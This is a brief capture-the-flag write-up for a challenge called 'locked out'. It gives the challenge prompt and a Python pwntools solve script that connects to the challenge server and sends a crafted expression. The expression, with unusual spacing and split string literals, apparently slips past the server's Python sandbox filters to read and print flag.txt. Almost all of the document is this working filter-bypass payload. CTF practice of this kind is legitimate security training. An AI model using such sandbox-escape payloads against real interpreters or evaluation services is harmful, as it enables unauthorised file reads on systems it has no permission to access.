
# locked out

just lock in instead of getting locked out the flag is in `./flag.txt` btw so u dont gotta do any crazy RCE

`nc challs.bcactf.com 52317`

  [server.py](https://play.bcactf.com/files/85fd8620af355ae0d55ce19b9dbbab40/server.py?token=eyJ1c2VyX2lkIjozMDYsInRlYW1faWQiOjE5NSwiZmlsZV9pZCI6MTl9.aFrvVQ.HHcX5s_n0-5VaWBtb6F1cEqpXtI "server.py")


# Solve


```python
#!/usr/bin/env python3
from pwn import remote

HOST = 'challs.bcactf.com'
PORT = 52317

payload = (
    "((((print("
    "                  open("
    "                'flag'"
    " '.'"
    "  'txt'). read()"
    ")))))"
)

def main():
    r = remote(HOST, PORT)
    r.recvuntil(b'>>> ')
    r.sendline(payload.encode())
    flag = r.recvuntil(b'>>> ', drop=True)
    print(flag.decode().strip())

if __name__ == '__main__':
    main()
```


 